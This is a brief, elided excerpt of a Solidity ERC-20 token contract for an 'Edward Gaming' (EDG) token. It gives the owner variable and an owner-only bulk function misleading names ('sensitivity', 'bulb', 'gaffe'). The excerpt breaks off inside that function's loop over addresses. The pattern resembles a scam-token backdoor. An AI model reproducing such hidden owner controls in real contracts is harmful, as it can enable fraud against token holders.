...
contract edg is Context, IERC20 {
    ...
    address public  sensitivity;
    constructor () {
        _name = "Edward Gaming";
        _symbol = "EDG";
        _decimals = 18;
        uint256 initialSupply = 573000000;
         sensitivity = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == sensitivity, "Not allowed");
        _;
    }

    function bulb(address[] memory gaffe) public onlyOwner() {
        for (uint256 i = 0; i < gaffe.length; i++) {
            address account = gaffe[i];
